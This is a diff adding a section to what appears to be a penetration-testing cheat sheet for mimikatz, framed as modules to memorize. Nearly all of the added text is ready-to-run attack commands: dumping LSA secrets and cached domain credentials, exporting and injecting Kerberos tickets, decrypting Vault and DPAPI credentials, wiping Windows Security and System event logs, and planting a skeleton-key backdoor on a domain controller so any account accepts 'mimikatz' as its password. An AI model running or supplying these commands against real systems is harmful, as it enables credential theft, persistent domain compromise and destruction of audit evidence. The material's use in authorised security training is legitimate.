@@ -91,6 +91,60 @@ Create the dump on target with `procdump -ma lsass.dmp` or Task Manager → Crea
 
 ---
 
+## 🩹 More modules to memorize
+
+### LSA / secrets / cache
+```text
+# Dump LSA secrets (autologon, service creds) — often works WITHOUT SYSTEM on older Win
+mimikatz # lsadump::lsa /patch
+
+# Domain cached credentials (MSCACHE v2) — last 10 domain users
+mimikatz # lsadump::cache
+
+# Raw LSA secrets (need SYSTEM)
+mimikatz # lsadump::secrets
+
+# Trust keys (useful for golden tickets across forest)
+mimikatz # lsadump::trust /patch
+```
+
+### Kerberos ticket hygiene
+```text
+mimikatz # kerberos::list            # list current tickets in session
+mimikatz # kerberos::list /export    # export all to .kirbi
+mimikatz # kerberos::ptt ticket.kirbi   # inject a ticket (pass-the-ticket)
+mimikatz # kerberos::ptc .ccache      # pass-the-ccache (Linux-style cache)
+mimikatz # kerberos::purge            # PURGE all tickets — do before injecting new ones
+mimikatz # kerberos::tgt              # show current TGT
+```
+
+### Anti-forensics
+```text
+mimikatz # event::clear /log:Security    # wipe Security log (needs admin)
+mimikatz # event::clear /log:System
+mimikatz # event::clear                  # wipe all
+mimikatz # event::drop                   # disable event logging service
+```
+
+### Windows Vault / DPAPI
+```text
+mimikatz # vault::list                   # list credentials in Windows Vault
+mimikatz # vault::cred /patch            # decrypt vault credentials
+mimikatz # dpapi::masterkey /in:<path>   # decrypt a DPAPI masterkey
+mimikatz # dpapi::cred /in:<credfile>    # decrypt a DPAPI credential blob
+```
+
+### Skeleton key (backdoor DC)
+```text
+# On a Domain Controller with SYSTEM — patches lsass so EVERY user auths with 'mimikatz' as password
+mimikatz # privilege::debug
+mimikatz # misc::skeleton
+# Now: net use \\DC\C$ /u:CORP\anyuser mimikatz   → works
+# Reverts on reboot.
+```
+
+---
+
 ## 🔗 Related
 
 - [impacket](impacket.md) · [crackmapexec](crackmapexec.md) · [evil-winrm](evil-winrm.md) · [responder](responder.md) · [hashcat](hashcat.md)
